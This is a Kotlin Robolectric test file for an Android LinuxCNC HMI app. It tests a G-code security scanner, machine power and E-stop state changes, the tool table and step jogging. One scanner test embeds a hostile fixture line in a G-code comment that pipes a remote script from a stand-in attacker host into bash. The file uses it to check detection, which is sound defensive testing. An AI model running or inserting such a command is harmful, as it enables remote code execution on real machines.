package com.example

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import com.example.model.MachineStateEnum
import com.example.model.ThreatLevel
import com.example.service.CncSecurityScanner
import com.example.service.LinuxCncEngine
import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class ExampleRobolectricTest {

    @Test
    fun `read string from context`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val appName = context.getString(R.string.app_name)
        assertEquals("LinuxCNC Droid HMI", appName)
    }

    @Test
    fun `security scanner blocks malicious Trojan shell injection in gcode`() {
        val scanner = CncSecurityScanner()
        val maliciousGCode = """
            (FACING OPERATION)
            G21 G90
            G0 X0 Y0 Z10
            (MALICIOUS PAYLOAD: ; curl -s http://attacker.com/malware.sh | bash ;)
            M100 P1
            M2
        """.trimIndent()

        val result = scanner.scanGCode("infected_trojan.ngc", maliciousGCode)
        assertFalse("Malicious GCode must not be executable", result.isExecutable)
        assertEquals(ThreatLevel.MALWARE_BLOCKED, result.threatLevel)
        assertTrue(result.threats.any { it.code == "SEC-004" || it.code == "SEC-007" })
    }

    @Test
    fun `security scanner passes clean gcode programs`() {
        val scanner = CncSecurityScanner()
        val cleanGCode = """
            (SAFE HIGH SPEED TROCHOIDAL POCKET 6061)
            G21 G90 G54
            G0 Z15.000
            G0 X10.000 Y10.000
            M3 S18000
            G1 Z-3.000 F400
            G1 X40.000 Y10.000 F2200
            G2 X50.000 Y20.000 I0.0 J10.0
            G1 X50.000 Y50.000
            G2 X40.000 Y60.000 I-10.0 J0.0
            G0 Z15.000
            M5
            M2
        """.trimIndent()

        val result = scanner.scanGCode("clean_pocket.ngc", cleanGCode)
        assertTrue("Clean GCode must be executable", result.isExecutable)
        assertEquals(ThreatLevel.CLEAN, result.threatLevel)
        assertTrue(result.threats.isEmpty())
        assertTrue(result.sha256Fingerprint.isNotEmpty())
    }

    @Test
    fun `linux cnc engine safely transitions states and logs events`() {
        val engine = LinuxCncEngine()
        assertEquals(MachineStateEnum.OFF, engine.machineState.value)

        // Turn Power ON
        engine.powerOn()
        assertEquals(MachineStateEnum.ON, engine.machineState.value)

        // Trip ESTOP
        engine.toggleEstop()
        assertEquals(MachineStateEnum.ESTOP, engine.machineState.value)

        // Verify that ESTOP logged a CRITICAL event
        val logs = engine.eventLogs.value
        assertTrue(logs.any { it.tag == "SAFETY" && it.severity == com.example.model.LogSeverity.CRITICAL })
    }

    @Test
    fun `tool table manager allows mounting tool and touching off length offset`() {
        val engine = LinuxCncEngine()
        assertEquals(1, engine.activeTool.value.id)

        // Mount Tool 3 (6mm Bull Nose)
        engine.mountTool(3)
        assertEquals(3, engine.activeTool.value.id)
        assertEquals("6mm R0.5 Bull Nose Endmill", engine.activeTool.value.description)
        assertEquals(3, engine.tool.value.toolNumber)

        // Touch off Z at -25.430
        engine.touchOffToolZ(3, -25.430)
        val updatedTool = engine.toolTable.value.find { it.id == 3 }
        assertNotNull(updatedTool)
        assertEquals(25.430, updatedTool!!.lengthOffset, 0.001)
    }

    @Test
    fun `step jog correctly moves axes in discrete precision increments`() {
        val engine = LinuxCncEngine()
        engine.powerOn()
        val initialX = engine.axes.value["X"]?.workPos ?: 0.0

        // Step jog X +0.100 mm
        engine.stepJog("X", 1, 0.100)
        val afterJogX = engine.axes.value["X"]?.workPos ?: 0.0
        assertEquals(initialX + 0.100, afterJogX, 0.001)
    }
}
